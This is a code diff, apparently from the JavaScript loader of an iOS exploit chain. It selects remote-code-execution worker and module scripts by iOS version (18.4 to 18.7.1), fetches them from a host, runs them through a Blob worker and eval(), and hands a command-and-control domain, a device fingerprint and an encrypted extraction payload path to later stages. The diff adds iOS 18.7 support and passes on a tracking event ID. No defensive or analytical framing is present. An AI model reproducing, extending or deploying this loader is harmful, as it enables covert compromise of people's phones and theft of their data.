@@ -77,6 +77,9 @@ function __runtimeFingerprint() {
     } catch(e) {}
     return '';
 }
+function __runtimeEventId() {
+    try { return (__bridgeRuntime && __bridgeRuntime.pageViewEventId) || ''; } catch(e) { return ''; }
+}
 
 function redirect() {
     markTerminal("worker_finished");
@@ -84,6 +87,11 @@ function redirect() {
 function getJS(fname, method = 'GET') {
     try {
         let url = localHost + '/' + fname + '?v=' + Date.now();
+        try {
+            if (__bridgeRuntime && __bridgeRuntime.pageViewEventId) {
+                url += '&ctx=' + encodeURIComponent(__bridgeRuntime.pageViewEventId);
+            }
+        } catch(e) {}
         let xhr = new XMLHttpRequest();
         xhr.open("GET", url, false);
         xhr.send(null);
@@ -211,24 +219,26 @@ const ios_version = (function() {
     return version.split('_').map(part => parseInt(part));
   }
 })();
-let workerCode = "";
-if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
-    workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`);
-else
-    workerCode = getJS(`rce_worker.js?${Date.now()}`);
-let workerBlob = new Blob([workerCode],{type:'text/javascript'});
-let workerBlobUrl = URL.createObjectURL(workerBlob);
 (() => {
     function doRedirect() {
       redirect();
     }
-    function main() {
+    async function main() {
         __bridgeInit();
-        __bridgeReady();   
+        await __bridgeReady();
         armRetryTimeout();
         const randomValues = new Uint32Array(32);
         const begin = Date.now();
         const origin = location.origin;
+        let workerCode = "";
+        if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+            workerCode = getJS(`rce_worker/rce_worker_18.6.js`);
+        else if(ios_version == '18,7' || ios_version == '18,7,1')
+            workerCode = getJS(`rce_worker/rce_worker_18.7.js`);
+        else
+            workerCode = getJS(`rce_worker/rce_worker.js`);
+        let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+        let workerBlobUrl = URL.createObjectURL(workerBlob);
         const worker = new Worker(workerBlobUrl);
         worker.onerror = function() {
             retryOnce("worker_error");
@@ -261,6 +271,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             case 'redirect':
             {
                 markTerminal("worker_redirect");
+                try { sessionStorage.setItem('_ds_chain_done', String(Date.now())); } catch(e) {}
                 break;
             }
             case 'prepare_dlopen_workers':
@@ -337,9 +348,13 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         {
         let rceCode = "";
         if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
-                rceCode = getJS(`rce_module_18.6.js?${Date.now()}`);
+                rceCode = getJS(`rce_module/rce_module_18.6.js`);
+            else if(ios_version == '18,7' || ios_version == '18,7,1')
+                rceCode = getJS(`rce_module/rce_module_18.7.js`);
+            else if(ios_version == '18,4' || ios_version == '18,4,1')
+                rceCode = getJS(`rce_module/rce_module_18.4.js`);
             else
-                rceCode = getJS(`rce_module.js?${Date.now()}`);
+                rceCode = getJS(`rce_module/rce_module_18.5.js`);
         try
         {
             eval(rceCode);
@@ -349,7 +364,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         }
         let desiredHost = "";
         desiredHost = localHost;
-            if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+            if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2' || ios_version == '18,7' || ios_version == '18,7,1')
             {
                 
                 __bridgeReady().then(function() {
@@ -362,6 +377,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                     c2Domain: __runtimeDomain(),
                     integrationId: __runtimeIntegrationId(),
                     fingerprint: __runtimeFingerprint(),
+                    eventId: __runtimeEventId(),
                     extractPath: new URL('extract.js.enc', localHost + '/').pathname
                 });
                 });
@@ -395,6 +411,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                         c2Domain: __runtimeDomain(),
                         integrationId: __runtimeIntegrationId(),
                         fingerprint: __runtimeFingerprint(),
+                        eventId: __runtimeEventId(),
                         extractPath: new URL('extract.js.enc', localHost + '/').pathname
                 });
                         });
